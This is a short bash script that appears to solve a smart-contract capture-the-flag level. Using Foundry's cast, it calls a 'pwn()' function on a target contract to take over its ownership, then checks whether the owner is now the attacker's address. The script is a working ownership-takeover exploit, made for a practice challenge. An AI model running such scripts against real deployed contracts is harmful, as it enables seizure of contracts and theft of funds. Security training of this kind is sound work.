#!/usr/bin/env bash
set -e

CONTRACT="$1"

[ "$CONTRACT" == "" ] && echo "A contract address must be specified as the first argument" >&2 && exit 1
[ "$ETH_RPC_URL" == "" ] && echo "ETH_RPC_URL not set" >&2 && exit 1
[ "$CHAIN" == "" ] && echo "CHAIN not set" >&2 && exit 1

if [ "$PRIVATE_KEY" == "" ]
then
	echo "Enter private key"
	read -s "PRIVATE_KEY"
fi
PRIVATE_KEY=$(echo $PRIVATE_KEY | sed 's/^0x//')

ATTACKER_ADDRESS=$(cast wallet address --private-key ${PRIVATE_KEY} | tr [:upper:] [:lower:])

cast send \
	--private-key ${PRIVATE_KEY} \
	${CONTRACT} \
	$(cast sig 'pwn()')

NEW_OWNER=0x$(cast call ${CONTRACT} "$(cast calldata 'owner()(address)')" | tr -d '\t\n\r\0' | tail -c 40)
echo "New OWNER: ${NEW_OWNER}"

if [ "${NEW_OWNER}" == "${ATTACKER_ADDRESS}" ]
then
	echo "Level completed, submit instance"
else
	echo "ERROR: Solution failed"
fi
